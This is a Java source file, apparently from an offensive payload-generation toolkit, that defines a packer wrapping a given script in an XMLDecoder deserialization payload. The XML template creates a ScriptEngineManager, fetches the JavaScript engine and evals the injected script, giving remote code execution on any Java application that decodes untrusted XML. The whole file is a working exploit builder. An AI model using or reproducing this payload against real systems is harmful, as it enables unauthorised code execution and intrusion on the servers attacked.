package com.reajason.javaweb.packer.xmldecoder;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

/**
 * @author ReaJason
 * @since 2025/7/22
 */
public class XMLDecoderScriptEnginePacker implements Packer {
    String template = "<java>\n" +
            "    <object class=\"javax.script.ScriptEngineManager\">\n" +
            "        <void method=\"getEngineByName\">\n" +
            "            <string>js</string>\n" +
            "            <void method=\"eval\">\n" +
            "                <string>{{script}}</string>\n" +
            "            </void>\n" +
            "        </void>\n" +
            "    </object>\n" +
            "</java>";

    @Override
    public String pack(ClassPackerConfig config) {
        String script = Packers.ScriptEngine.getInstance().pack(config);
        return template.replace("{{script}}", script);
    }
}
